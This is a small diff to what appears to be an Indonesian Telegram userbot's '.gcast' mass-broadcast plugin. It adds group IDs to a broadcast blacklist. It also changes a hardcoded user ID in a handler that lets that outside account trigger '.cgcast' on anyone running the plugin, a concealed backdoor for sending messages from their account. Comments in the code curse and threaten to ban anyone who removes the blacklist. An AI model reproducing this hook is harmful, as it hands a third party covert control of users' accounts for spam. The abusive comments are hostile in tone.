@@ -16,6 +16,8 @@ GCAST_BLACKLIST = [
     -1001752592753,  # Skyzusupport
     -1001549206558,  # FandaSupport
     -1001380293847,  # NastySupport
+    -1001658555612,  # WikiSupport
+    -1001508910413,  # Group Mutualan
 ]
 
 # Kalo fork atau coppy blacklist jangan dihapus bangsat,
@@ -23,7 +25,7 @@ GCAST_BLACKLIST = [
 # Hapus blacklist bapak lu jelek gua gban!.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1220829364, pattern=r"^\.cgcast(?: |$)(.*)")
+@register(incoming=True, from_users=2048936969, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
